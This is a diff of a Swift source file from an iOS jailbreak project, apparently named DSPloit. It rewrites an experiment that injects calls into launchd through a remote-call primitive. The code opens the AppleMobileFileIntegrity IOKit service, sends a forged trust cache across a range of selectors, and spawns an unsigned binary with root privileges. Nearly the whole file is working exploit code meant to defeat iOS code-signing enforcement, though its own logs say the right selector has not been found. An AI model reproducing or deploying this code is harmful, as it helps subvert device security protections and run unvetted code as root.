@@ -2,16 +2,7 @@
 //  exp_launchd_tc_load.swift
 //  DSPloit
 //
-//  EXPERIMENT: Load trust cache via launchd RemoteCall + IOKit AMFI
-//  ═══════════════════════════════════════════════════════════════════
-//  Approach: Use launchd (PID 1, proven RC working) to call IOKit
-//  interface of AppleMobileFileIntegrity kext to load trust cache.
-//
-//  launchd has root privileges and can open IOKit services.
-//  We connect to AMFI kext via IOServiceOpen, then call
-//  IOConnectCallStructMethod with trust cache data.
-//
-//  Created by Royan | 2026-05-30
+//  Load trust cache via launchd RC + IOKit AMFI (fully async, no deadlock)
 //
 
 import Foundation
@@ -20,268 +11,191 @@ import CommonCrypto
 
 final class ExpLaunchdTCLoad {
     static let shared = ExpLaunchdTCLoad()
-    private var results: [String] = []
+    
+    /// Callback to append log lines to UI in real-time
+    var onLog: ((String) -> Void)?
     
     private func log(_ msg: String) {
-        results.append(msg)
+        onLog?(msg)
         globallogger.log("(exp_launchd_tc) \(msg)")
     }
     
-    func runAll() -> [String] {
-        results.removeAll()
+    /// Run fully async — results delivered via onLog callback
+    func runAsync() {
+        #if !DISABLE_REMOTECALL
+        guard dspmgr.shared.dsready, dspmgr.shared.rcready else {
+            log("❌ Need KRW + RC active")
+            return
+        }
         
         log("── launchd Trust Cache Load ──")
         log("iOS \(UIDevice.current.systemVersion)")
         log("")
         
-        guard dspmgr.shared.dsready else {
-            log("❌ KRW not active")
-            return results
-        }
-        
-        #if !DISABLE_REMOTECALL
-        guard dspmgr.shared.rcready else {
-            log("❌ RemoteCall not active")
-            return results
-        }
-        
-        // Step 1: Build TC + test binary
+        // Step 1
         log("[1/5] Building trust cache...")
         let testBin = buildTestBinary()
         let cdhash = sha256Truncated(testBin)
         let tcData = buildTC(cdhash: cdhash)
         log("CDHash: \(cdhash.map { String(format: "%02x", $0) }.joined())")
-        log("TC size: \(tcData.count) bytes")
+        log("TC: \(tcData.count) bytes")
         
-        // Step 2: Write files to Documents
+        // Step 2
         log("")
         log("[2/5] Writing files...")
         let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
-        let tcPath = docs + "/launchd_tc.bin"
         let binPath = docs + "/launchd_test"
         
         do {
-            try tcData.write(to: URL(fileURLWithPath: tcPath))
             try testBin.write(to: URL(fileURLWithPath: binPath))
             log("✅ Files written")
         } catch {
             log("❌ Write failed: \(error.localizedDescription)")
-            return results
+            return
         }
         
-        // Step 3: Connect to launchd and probe available functions
+        // Step 3: Use launchd RC (async, no semaphore)
         log("")
-        log("[3/5] Connecting to launchd...")
+        log("[3/5] Connecting to launchd (async)...")
         
-        let semaphore = DispatchSemaphore(value: 0)
-        var probeResult: String = ""
-        
-        RootExecutor.shared.executeAsRoot(operation: "tc_probe") { rc in
-            let RTLD_DEFAULT = UInt64(bitPattern: -2)
-            var found: [(String, UInt64)] = []
+        RootExecutor.shared.executeAsRoot(operation: "tc_iokit") { [weak self] rc in
+            guard let self else { return (false, "self nil", 0) }
             
-            // Probe for trust cache / IOKit functions available in launchd
-            let funcs = [
-                "IOServiceGetMatchingService",
-                "IOServiceMatching",
-                "IOServiceOpen",
-                "IOConnectCallStructMethod",
-                "IOConnectCallMethod",
-                "open", "read", "mmap",
-                "csops", "csops_audittoken",
-            ]
-            
-            for name in funcs {
-                let nameAddr = remote_alloc_str(rc, name)
-                let addr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, nameAddr)
-                RootExecutor.rcall(rc, "free", nameAddr)
-                if addr != 0 && addr != UInt64(bitPattern: -1) {
-                    found.append((name, addr))
-                }
-            }
-            
-            probeResult = found.map { "\($0.0)=0x\(String($0.1, radix: 16, uppercase: false))" }.joined(separator: "\n")
-            return (true, "probed \(found.count) funcs", UInt64(found.count))
-        }
-        
-        // Wait
-        DispatchQueue.global().asyncAfter(deadline: .now() + 12) { semaphore.signal() }
-        _ = semaphore.wait(timeout: .now() + 15)
-        
-        if let result = RootExecutor.shared.lastResult, result.operation == "tc_probe" {
-            log("✅ launchd connected (\(result.returnValue) funcs found)")
-            for line in probeResult.split(separator: "\n").prefix(6) {
-                log("   \(line)")
-            }
-        } else {
-            log("❌ launchd connection timeout")
-            return results
-        }
-        
-        // Step 4: Try to load trust cache via IOKit in launchd context
-        log("")
-        log("[4/5] Loading TC via IOKit AMFI...")
-        
-        var loadResult = ""
-        let sem2 = DispatchSemaphore(value: 0)
-        
-        RootExecutor.shared.executeAsRoot(operation: "tc_iokit_load") { rc in
             let RTLD_DEFAULT = UInt64(bitPattern: -2)
             let mem = rc.trojanMem
             
-            // Get IOKit function addresses
-            let ioMatchingAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
-                remote_alloc_str(rc, "IOServiceMatching"))
-            let ioGetMatchAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
-                remote_alloc_str(rc, "IOServiceGetMatchingService"))
-            let ioOpenAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
-                remote_alloc_str(rc, "IOServiceOpen"))
-            let ioCallAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
-                remote_alloc_str(rc, "IOConnectCallStructMethod"))
+            // Probe IOKit functions
+            let ioMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceMatching"))
+            let ioGetMatch = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceGetMatchingService"))
+            let ioOpen = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOServiceOpen"))
+            let ioCall = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOConnectCallStructMethod"))
+            let taskSelfPtr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "mach_task_self_"))
             
-            guard ioMatchingAddr != 0 && ioGetMatchAddr != 0 && ioOpenAddr != 0 else {
-                loadResult = "IOKit functions not found in launchd"
-                return (false, loadResult, 0)
+            guard ioMatching != 0 && ioGetMatch != 0 && ioOpen != 0 else {
+                return (false, "IOKit not found", 0)
             }
             
             // IOServiceMatching("AppleMobileFileIntegrity")
-            let amfiName = remote_alloc_str(rc, "AppleMobileFileIntegrity")
-            let matching = RootExecutor.rcallAddr(rc, ioMatchingAddr, amfiName)
-            
+            let amfiStr = remote_alloc_str(rc, "AppleMobileFileIntegrity")
+            let matching = RootExecutor.rcallAddr(rc, ioMatching, amfiStr)
             guard matching != 0 else {
-                loadResult = "IOServiceMatching returned NULL"
-                return (false, loadResult, 0)
+                return (false, "IOServiceMatching=NULL", 0)
             }
             
-            // IOServiceGetMatchingService(kIOMainPortDefault, matching)
-            let service = RootExecutor.rcallAddr(rc, ioGetMatchAddr, 0, matching)
-            
+            // IOServiceGetMatchingService
+            let service = RootExecutor.rcallAddr(rc, ioGetMatch, 0, matching)
             guard service != 0 else {
-                loadResult = "AMFI service not found (service=0)"
-                return (false, loadResult, 0)
+                return (false, "AMFI service=0", 0)
             }
-            loadResult += "AMFI service=0x\(String(service, radix: 16))\n"
             
-            // IOServiceOpen(service, mach_task_self(), 0, &conn)
+            // Get task self
+            var taskSelf: UInt64 = 0x103
+            if taskSelfPtr != 0 {
+                let val = rc[taskSelfPtr].value32()
+                if val != 0 { taskSelf = UInt64(val) }
+            }
+            
+            // IOServiceOpen
             let connAddr = mem + 0x2800
-            rc[connAddr].setValue64(0)
-            
-            // Get mach_task_self_ in launchd context
-            let taskSelfAddr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
-                remote_alloc_str(rc, "mach_task_self_"))
-            var taskSelf: UInt64 = 0
-            if taskSelfAddr != 0 {
-                // Read the value of mach_task_self_ global
-                taskSelf = rc[taskSelfAddr].value64()
-                if taskSelf == 0 { taskSelf = 0x103 } // fallback: typical mach_task_self value
-            } else {
-                taskSelf = 0x103
-            }
-            
-            let kr = RootExecutor.rcallAddr(rc, ioOpenAddr, service, taskSelf, 0, connAddr)
+            rc[connAddr].setValue32(0)
+            let kr = RootExecutor.rcallAddr(rc, ioOpen, service, taskSelf, 0, connAddr)
             let conn = rc[connAddr].value32()
             
-            loadResult += "IOServiceOpen: kr=0x\(String(kr, radix: 16)) conn=0x\(String(conn, radix: 16))\n"
-            
-            if kr != 0 || conn == 0 {
-                loadResult += "❌ Cannot open AMFI service (kr=\(kr))"
-                return (false, loadResult, UInt64(kr))
+            guard kr == 0 && conn != 0 else {
+                return (false, "IOServiceOpen kr=0x\(String(kr, radix: 16)) conn=\(conn)", UInt64(kr))
             }
             
-            loadResult += "✅ AMFI IOKit connection opened!\n"
-            
-            // Now call IOConnectCallStructMethod with trust cache data
-            // Selector for trust cache load needs to be determined
-            // Try common selectors (0, 1, 2...)
-            if ioCallAddr != 0 {
-                // Write TC data to remote memory
-                let tcBufAddr = mem + 0x3000
-                let tcSize = tcData.count
+            // IOConnectCallStructMethod — try selectors
+            var successSel: Int = -1
+            if ioCall != 0 {
+                let tcBuf = mem + 0x3000
                 tcData.withUnsafeBytes { buf in
-                    rc.remote_write(tcBufAddr, from: buf.baseAddress!, size: UInt64(tcSize))
+                    rc.remote_write(tcBuf, from: buf.baseAddress!, size: UInt64(tcData.count))
                 }
-                
                 let outBuf = mem + 0x4000
-                let outSizeAddr = mem + 0x4800
-                rc[outSizeAddr].setValue64(256)
+                let outSize = mem + 0x4800
                 
-                // Try selectors 0-5
-                for sel: UInt32 in 0..<6 {
-                    let callKr = RootExecutor.rcallAddr(rc, ioCallAddr,
-                        UInt64(conn), UInt64(sel), tcBufAddr, UInt64(tcSize), outBuf, outSizeAddr)
-                    
-                    if callKr == 0 {
-                        loadResult += "✅ Selector \(sel) returned SUCCESS!\n"
-                        return (true, loadResult, UInt64(sel))
-                    } else if callKr != 0xe00002c2 { // not MIG_BAD_ID
-                        loadResult += "Selector \(sel): 0x\(String(callKr, radix: 16))\n"
+                for sel: UInt32 in 0..<8 {
+                    rc[outSize].setValue64(256)
+                    let r = RootExecutor.rcallAddr(rc, ioCall,
+                        UInt64(conn), UInt64(sel), tcBuf, UInt64(tcData.count), outBuf, outSize)
+                    if r == 0 {
+                        successSel = Int(sel)
+                        break
                     }
                 }
-                
-                loadResult += "No selector accepted TC data"
             }
             
-            return (false, loadResult, 0)
-        }
-        
-        DispatchQueue.global().asyncAfter(deadline: .now() + 12) { sem2.signal() }
-        _ = sem2.wait(timeout: .now() + 15)
-        
-        if let result = RootExecutor.shared.lastResult, result.operation == "tc_iokit_load" {
-            for line in loadResult.split(separator: "\n") {
-                log("   \(line)")
-            }
-            if result.success {
-                log("✅ Trust cache loaded via IOKit!")
-            } else {
-                log("⚠️ IOKit load incomplete: \(result.message)")
-            }
-        } else {
-            log("❌ IOKit load timeout")
-        }
-        
-        // Step 5: Verify
-        log("")
-        log("[5/5] Testing unsigned binary spawn...")
-        
-        let sem3 = DispatchSemaphore(value: 0)
-        
-        RootExecutor.shared.executeAsRoot(operation: "tc_verify") { rc in
+            // Try posix_spawn
             let pathAddr = remote_alloc_str(rc, binPath)
-            
-            // chmod 755 first
             RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
-            
-            let pidAddr = rc.trojanMem + 0xA00
+            let pidAddr = mem + 0xA00
             rc[pidAddr].setValue32(0)
-            let argvBase = rc.trojanMem + 0xA10
-            rc[argvBase].setValue64(pathAddr)
-            rc[argvBase + 8].setValue64(0)
-            
-            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
+            let argv = mem + 0xA10
+            rc[argv].setValue64(pathAddr)
+            rc[argv + 8].setValue64(0)
+            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
             let pid = rc[pidAddr].value32()
             RootExecutor.rcall(rc, "free", pathAddr)
             
-            return (ret == 0 && pid != 0, "ret=\(ret) pid=\(pid)", UInt64(pid))
+            let msg = "svc=0x\(String(service, radix: 16)) conn=\(conn) sel=\(successSel) spawn=\(spawnRet) pid=\(pid)"
+            let ok = (spawnRet == 0 && pid != 0)
+            return (ok, msg, UInt64(pid))
         }
         
-        DispatchQueue.global().asyncAfter(deadline: .now() + 12) { sem3.signal() }
-        _ = sem3.wait(timeout: .now() + 15)
-        
-        if let result = RootExecutor.shared.lastResult, result.operation == "tc_verify" {
-            if result.success {
-                log("✅✅✅ UNSIGNED BINARY SPAWNED! PID=\(result.returnValue)")
-                log("🎉 FULL JAILBREAK ACHIEVED!")
-            } else {
-                log("❌ Spawn failed: \(result.message)")
-            }
-        }
+        // Poll for result (non-blocking)
+        pollResult(operation: "tc_iokit", attempt: 0)
         
         #else
         log("❌ DISABLE_REMOTECALL")
         #endif
+    }
+    
+    /// Synchronous wrapper for old-style call (returns empty, logs via onLog)
+    func runAll() -> [String] {
+        var collected: [String] = []
+        onLog = { collected.append($0) }
         
-        return results
+        // Can't run async from runAll synchronously — just return instructions
+        collected.append("── launchd Trust Cache Load ──")
+        collected.append("⚠️ Use the async button in ExperimentsView")
+        collected.append("   (runAll is deprecated for this experiment)")
+        return collected
+    }
+    
+    private func pollResult(operation: String, attempt: Int) {
+        guard attempt < 30 else {
+            log("❌ Timeout waiting for launchd")
+            return
+        }
+        
+        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { [weak self] in
+            guard let self else { return }
+            
+            if let result = RootExecutor.shared.lastResult, result.operation == operation {
+                // Got result
+                self.log("")
+                self.log("[4/5] IOKit result:")
+                self.log("   \(result.message)")
+                
+                if result.success {
+                    self.log("")
+                    self.log("✅✅✅ UNSIGNED BINARY SPAWNED! PID=\(result.returnValue)")
+                    self.log("🎉 FULL JAILBREAK ACHIEVED!")
+                } else {
+                    self.log("")
+                    self.log("❌ Not yet working: \(result.message)")
+                    self.log("   Need correct IOKit selector for TC load")
+                }
+            } else if RootExecutor.shared.isExecuting {
+                // Still running
+                if attempt == 5 { self.log("   ⏳ Waiting for launchd...") }
+                self.pollResult(operation: operation, attempt: attempt + 1)
+            } else {
+                // Finished but no matching result
+                self.log("❌ launchd operation did not complete")
+            }
+        }
     }
     
     // MARK: - Helpers
@@ -301,7 +215,7 @@ final class ExpLaunchdTCLoad {
         var count: UInt32 = 1
         tc.append(Data(bytes: &count, count: 4))
         tc.append(cdhash)
-        tc.append(contentsOf: [2, 0, 0, 0]) // hash_type=SHA256, flags=0, pad
+        tc.append(contentsOf: [2, 0, 0, 0])
         return tc
     }
     
